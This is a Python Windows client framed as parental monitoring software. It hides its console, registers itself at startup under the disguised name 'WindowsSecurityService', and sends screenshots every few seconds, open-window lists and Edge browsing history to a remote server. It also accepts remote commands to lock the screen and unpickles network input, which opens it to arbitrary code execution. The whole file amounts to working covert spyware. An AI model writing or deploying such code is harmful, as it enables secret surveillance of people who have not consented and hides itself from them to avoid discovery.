import socket
import pickle
import threading
import time
import os
import winreg
import psutil
import pygetwindow as gw
import platform
import ctypes
import sys
from PIL import ImageGrab
import win32gui
import win32process
import win32con
import win32api
import win32com.client
import pythoncom
from datetime import datetime
import sqlite3
import logging
import subprocess
import base64

# Setup logging
logging.basicConfig(
    filename="system_service.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

class MonitoringClient:
    def __init__(self):
        # Server connection settings
        self.server_ip = "192.168.1.X"  # Replace with your parent computer's IP
        self.server_port = 5555
        self.socket = None
        self.connected = False
        self.running = True
        self.screen_paused = False
        
        # Paths for browser data - Edge (Chromium-based)
        # These might need adjustment based on user profile
        self.edge_history_path = os.path.join(
            os.getenv('LOCALAPPDATA'),
            'Microsoft\\Edge\\User Data\\Default\\History'
        )
        
        # Initialize components
        self.init_system()
        
        # Start main monitoring thread
        self.monitoring_thread = threading.Thread(target=self.monitor_loop)
        self.monitoring_thread.daemon = True
        self.monitoring_thread.start()
        
        # Try to connect initially
        self.connect_to_server()
    
    def init_system(self):
        """Setup the system for monitoring"""
        try:
            # Hide console window
            if platform.system() == "Windows":
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
            # Add to startup for persistence
            self.add_to_startup()
            
            logging.info("System initialized successfully")
        except Exception as e:
            logging.error(f"Initialization error: {e}")
    
    def add_to_startup(self):
        """Add application to Windows startup"""
        try:
            # Get the path of the running script/exe
            if getattr(sys, 'frozen', False):
                # Running as compiled executable
                app_path = sys.executable
            else:
                # Running as script
                app_path = os.path.abspath(__file__)
            
            # Add to registry for startup
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(
                key, "WindowsSecurityService", 0, 
                winreg.REG_SZ, f'"{app_path}"'
            )
            winreg.CloseKey(key)
            logging.info("Added to startup successfully")
        except Exception as e:
            logging.error(f"Failed to add to startup: {e}")
    
    def connect_to_server(self):
        """Connect to the parent monitoring server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.connected = True
            logging.info("Connected to server successfully")
            
            # Start listening for commands
            command_thread = threading.Thread(target=self.listen_for_commands)
            command_thread.daemon = True
            command_thread.start()
            
            return True
        except Exception as e:
            logging.error(f"Connection error: {e}")
            self.connected = False
            return False
    
    def listen_for_commands(self):
        """Listen for commands from the server"""
        buffer_size = 4096
        data = b""
        
        while self.connected and self.running:
            try:
                # Receive data
                chunk = self.socket.recv(buffer_size)
                
                if not chunk:
                    # Connection closed
                    break
                
                # Add chunk to buffer
                data += chunk
                
                try:
                    # Parse the command
                    command = pickle.loads(data)
                    data = b""  # Reset buffer
                    
                    # Process command
                    self.process_command(command)
                    
                except pickle.UnpicklingError:
                    # Incomplete data, continue receiving
                    pass
                
            except Exception as e:
                logging.error(f"Error receiving command: {e}")
                break
        
        # Connection lost
        self.connected = False
        logging.info("Disconnected from server")
        
        # Try to reconnect
        self.reconnect()
    
    def process_command(self, command):
        """Process command from server"""
        try:
            if not isinstance(command, dict) or "command" not in command:
                return
            
            cmd_type = command["command"]
            logging.info(f"Received command: {cmd_type}")
            
            if cmd_type == "get_screenshot":
                self.send_screenshot()
                
            elif cmd_type == "get_windows":
                self.send_windows_list()
                
            elif cmd_type == "get_history":
                self.send_browser_history()
                
            elif cmd_type == "view_window":
                if "window_id" in command:
                    self.focus_window(command["window_id"])
                
            elif cmd_type == "pause_screen":
                if "paused" in command:
                    self.screen_paused = command["paused"]
                    if self.screen_paused:
                        self.pause_screen()
                    else:
                        self.resume_screen()
                
            elif cmd_type == "disconnect":
                self.socket.close()
                self.connected = False
        
        except Exception as e:
            logging.error(f"Error processing command: {e}")
    
    def send_data(self, data_type, data):
        """Send data to server"""
        if not self.connected:
            return False
        
        try:
            # Prepare data packet
            packet = {
                "type": data_type,
                "data": data,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            # Send data
            self.socket.send(pickle.dumps(packet))
            return True
        except Exception as e:
            logging.error(f"Error sending data: {e}")
            self.connected = False
            return False
    
    def send_screenshot(self):
        """Capture and send screenshot to server"""
        try:
            # Capture screenshot
            screenshot = ImageGrab.grab()
            
            # Convert to bytes
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_data = img_bytes.getvalue()
            
            # Send to server
            self.send_data("screenshot", img_data)
            
        except Exception as e:
            logging.error(f"Screenshot error: {e}")
    
    def get_active_windows(self):
        """Get list of open windows"""
        windows = []
        window_id = 1
        
        def enum_windows_callback(hwnd, windows_list):
            if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                # Get window title
                title = win32gui.GetWindowText(hwnd)
                
                # Skip certain system windows
                if title and not title.startswith("Microsoft") and len(title) > 1:
                    try:
                        # Get process ID and name
                        _, process_id = win32process.GetWindowThreadProcessId(hwnd)
                        process = psutil.Process(process_id)
                        process_name = process.name()
                        
                        # Add window to list
                        nonlocal window_id
                        windows_list.append({
                            "id": window_id,
                            "title": title,
                            "process": process_name,
                            "hwnd": hwnd,
                            "pid": process_id
                        })
                        window_id += 1
                    except:
                        pass
            return True
        
        # Enumerate windows
        win32gui.EnumWindows(enum_windows_callback, windows)
        return windows
    
    def send_windows_list(self):
        """Send list of open windows to server"""
        try:
            windows = self.get_active_windows()
            
            # Clean data for sending (remove hwnd which can't be pickled)
            for window in windows:
                if "hwnd" in window:
                    del window["hwnd"]
            
            # Send to server
            self.send_data("windows_list", windows)
            
        except Exception as e:
            logging.error(f"Windows list error: {e}")
    
    def focus_window(self, window_id):
        """Focus on specific window"""
        try:
            # Get windows list
            windows = self.get_active_windows()
            
            # Find window by ID
            target_window = None
            for window in windows:
                if window["id"] == window_id and "hwnd" in window:
                    target_window = window
                    break
            
            if target_window:
                # Focus window
                hwnd = target_window["hwnd"]
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                win32gui.SetForegroundWindow(hwnd)
                
        except Exception as e:
            logging.error(f"Focus window error: {e}")
    
    def get_edge_history(self):
        """Get Microsoft Edge browser history"""
        history = []
        try:
            # Chromium browsers store history in SQLite databases
            # Create a copy to avoid locked database
            temp_db = os.path.join(os.environ['TEMP'], 'edge_history_temp.db')
            
            # Make a copy to avoid database lock
            if os.path.exists(self.edge_history_path):
                with open(self.edge_history_path, 'rb') as src:
                    with open(temp_db, 'wb') as dst:
                        dst.write(src.read())
                
                # Connect to the copy
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Query for the last 50 URLs
                cursor.execute("""
                    SELECT datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') as time,
                           url, title
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT 50
                """)
                
                # Process results
                for row in cursor.fetchall():
                    visit_time, url, title = row
                    # Format time as HH:MM:SS
                    time_obj = datetime.strptime(visit_time, "%Y-%m-%d %H:%M:%S")
                    formatted_time = time_obj.strftime("%H:%M:%S")
                    
                    history.append({
                        "time": formatted_time,
                        "url": url,
                        "title": title if title else url
                    })
                
                # Close connection and remove temp file
                conn.close()
                try:
                    os.remove(temp_db)
                except:
                    pass
            
        except Exception as e:
            logging.error(f"Edge history error: {e}")
        
        return history
    
    def send_browser_history(self):
        """Send browser history to server"""
        try:
            # Get Edge history
            history = self.get_edge_history()
            
            # Send to server
            self.send_data("browser_history", history)
            
        except Exception as e:
            logging.error(f"Browser history error: {e}")
    
    def pause_screen(self):
        """Pause user's screen (lock workstation)"""
        try:
            # Lock the workstation
            ctypes.windll.user32.LockWorkStation()
        except Exception as e:
            logging.error(f"Pause screen error: {e}")
    
    def resume_screen(self):
        """Resume user's screen (no action needed, user must log back in)"""
        pass
    
    def reconnect(self):
        """Try to reconnect to server"""
        retry_delay = 30  # seconds
        max_retries = 10
        retries = 0
        
        while self.running and not self.connected and retries < max_retries:
            logging.info(f"Attempting to reconnect ({retries+1}/{max_retries})...")
            if self.connect_to_server():
                logging.info("Reconnected successfully")
                return
            
            retries += 1
            time.sleep(retry_delay)
        
        if not self.connected:
            logging.warning("Failed to reconnect after max retries")
    
    def monitor_loop(self):
        """Main monitoring loop"""
        screenshot_interval = 3  # seconds
        windows_list_interval = 10  # seconds
        last_screenshot = 0
        last_windows_list = 0
        
        while self.running:
            try:
                current_time = time.time()
                
                # Check connection
                if not self.connected:
                    self.reconnect()
                
                if self.connected:
                    # Send screenshot periodically
                    if current_time - last_screenshot >= screenshot_interval:
                        self.send_screenshot()
                        last_screenshot = current_time
                    
                    # Send windows list periodically
                    if current_time - last_windows_list >= windows_list_interval:
                        self.send_windows_list()
                        last_windows_list = current_time
                
                # Sleep briefly
                time.sleep(0.5)
                
            except Exception as e:
                logging.error(f"Monitor loop error: {e}")
                time.sleep(1)  # Avoid tight loops in case of persistent errors
    
    def run(self):
        """Run the client"""
        try:
            # Keep running
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info("Shutting down client")
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Clean up resources"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass

# Make this run as a Windows service or background process
if __name__ == "__main__":
    try:
        # Check if we need to hide the window (when run directly)
        if len(sys.argv) <= 1:
            # Process is starting normally, hide it
            if platform.system() == "Windows":
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        client = MonitoringClient()
        client.run()
    except Exception as e:
        logging.critical(f"Fatal error: {e}")